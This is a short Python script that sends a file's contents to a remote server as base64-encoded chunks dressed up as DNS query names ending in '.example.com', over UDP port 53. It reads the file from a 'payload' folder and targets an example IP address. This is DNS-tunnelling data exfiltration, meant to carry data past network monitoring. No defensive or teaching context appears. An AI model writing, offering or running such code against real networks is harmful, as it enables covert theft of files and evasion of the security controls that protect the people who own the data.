import socket
import base64
import os

def send_file_as_dns_queries(filename, server_ip, server_port=53, chunk_size=60):
    """
    Send a file as a series of DNS-like queries to a specified server.
    
    Args:
        filename (str): Name of the file to send.
        server_ip (str): IP address of the server to which the file will be sent.
        server_port (int, optional): Port on the server to which the file will be sent. Defaults to 53.
        chunk_size (int, optional): Size of file chunks to read and send. Defaults to 60 bytes.
        
    Explanation:
        - The function reads the specified file in small chunks.
        - Each chunk is then base64 encoded to ensure it consists only of ASCII characters.
        - The encoded chunk is appended with a domain-like suffix to simulate a DNS query.
        - This 'query' is sent to the specified server using UDP.
        - The function waits for a response from the server after each chunk is sent.
    """

    # Construct the full path to the file based on the current working directory and the specified filename.
    file_path = os.path.join(os.getcwd(), 'payload', filename)

    # Open the file in binary read mode.
    with open(file_path, 'rb') as file:
        while True:
            # Read a chunk of the file of size 'chunk_size' bytes.
            chunk = file.read(chunk_size)
            # If the chunk is empty (i.e., end of file), break out of the loop.
            if not chunk:
                break

            # Base64 encode the binary chunk. Base64 is used here to ensure that the data
            # can be safely formatted in a DNS query-like format without corruption.
            encoded_chunk = base64.urlsafe_b64encode(chunk).decode('ascii')

            # Ensure the base64 encoded string is properly padded to a multiple of 4 characters.
            # This is a requirement of base64 where the length of the encoded string must be divisible by 4.
            padding = '=' * ((4 - len(encoded_chunk) % 4) % 4)
            encoded_chunk += padding

            # Append a pseudo domain to the encoded string to simulate a DNS query.
            query = f"{encoded_chunk}.example.com"

            # Create a UDP socket.
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as client_socket:
                # Send the 'query' to the specified server IP and port.
                client_socket.sendto(query.encode(), (server_ip, server_port))

                # Set a timeout for the response; if no response is received within 2 seconds, consider it a timeout.
                client_socket.settimeout(2)
                try:
                    # Wait to receive a response from the server.
                    response, _ = client_socket.recvfrom(1024)
                    # Print the response from the server.
                    print(f"Response from server: {response.decode()}")
                except socket.timeout:
                    # If a timeout occurs, print an error message.
                    print("No response received; server may be down or check network.")

if __name__ == "__main__":
    # Example usage of the function.
    send_file_as_dns_queries("image.png", "172.16.223.86")
